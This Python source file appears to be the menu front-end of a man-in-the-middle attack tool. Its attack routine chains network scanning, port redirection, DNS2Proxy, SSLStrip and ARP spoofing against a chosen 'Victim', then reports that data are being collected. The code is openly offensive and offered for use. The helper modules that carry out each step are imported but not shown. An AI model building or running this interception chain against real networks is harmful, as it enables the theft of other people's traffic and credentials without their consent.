from mid import NetworkScan 
from mid import Utils
from mid import Redirection
import keyboard
import sys

class Menu:
    def __init__(self, action_table, network_scan):
        self.action_table = action_table
        self.nm = network_scan
        self.ut = Utils.Utils()
        self.c = Utils.bcolors()
        self.rd = Redirection.Redirection()
        self.ut.clean()
        

    def launch_menu(self):
        self.ut.logo()
        print(self.c.BOLD+"Choose an action: \n"+self.c.ENDC)
        for i in range (len(self.action_table)):
            print("     [%s] %s" % (i+1, self.action_table[i]))
        self.apply_menu_choice(input())

    def apply_menu_choice(self, choice):
        if(choice == '1'):
            self.attack()
        elif(choice == '2'):
            self.ut.clean()
            self.ut.free()
        else:
            self.ut.clean()
            print(self.c.FAIL+"Invalid input choice [%s]" % choice + self.c.ENDC)
            self.launch_menu()

    def attack(self):
        self.nm.launch()
        self.rd.openPort()
        self.rd.redirectPort()
        self.rd.launchDNS2Proxy()
        self.rd.launchSSLStrip()
        self.nm.arpspoof()
        self.ut.clean()
        self.ut.logo()
        print(self.c.BULLET+' Rooter: %s -> %s' % (self.nm.rooter[0], self.nm.rooter[1]))
        print(self.c.BULLET+' Victim: %s -> %s' % (self.nm.victim[0], self.nm.victim[1]))
        print('\nData are being collected ...')
        print('If you want to stop and go back to menu press <Enter>')
        input()
        self.ut.clean()
        self.launch_menu()
        